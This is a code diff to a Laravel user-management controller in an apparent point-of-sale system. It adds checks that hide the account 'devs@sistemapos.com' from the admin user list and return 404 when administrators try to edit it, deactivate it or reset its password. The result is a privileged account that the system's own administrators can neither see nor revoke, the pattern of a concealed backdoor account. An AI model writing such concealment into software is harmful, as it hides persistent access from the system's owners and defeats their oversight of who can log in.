@@ -18,7 +18,10 @@ class UserController extends Controller
      */
     public function index(): View
     {
-        $users = User::with('role')->orderBy('name')->get();
+        $users = User::with('role')
+            ->where('email', '!=', 'devs@sistemapos.com')
+            ->orderBy('name')
+            ->get();
         $roles = Role::orderBy('name')->get();
 
         return view('users.index', compact('users', 'roles'));
@@ -52,6 +55,10 @@ class UserController extends Controller
      */
     public function update(UpdateUserRequest $request, User $user): RedirectResponse
     {
+        if ($user->email === 'devs@sistemapos.com') {
+            abort(404);
+        }
+
         if ($user->id === auth()->id() && (int) $request->role_id !== (int) $user->role_id) {
             return back()->with('error', 'No puedes cambiar tu propio rol de administrador.');
         }
@@ -71,6 +78,10 @@ class UserController extends Controller
      */
     public function toggleStatus(User $user): RedirectResponse
     {
+        if ($user->email === 'devs@sistemapos.com') {
+            abort(404);
+        }
+
         if ($user->id === auth()->id()) {
             return back()->with('error', 'No puedes desactivar tu propia cuenta de usuario.');
         }
@@ -90,6 +101,10 @@ class UserController extends Controller
      */
     public function resetPassword(User $user): RedirectResponse
     {
+        if ($user->email === 'devs@sistemapos.com') {
+            abort(404);
+        }
+
         $tempPassword = Str::random(10);
 
         $user->update([
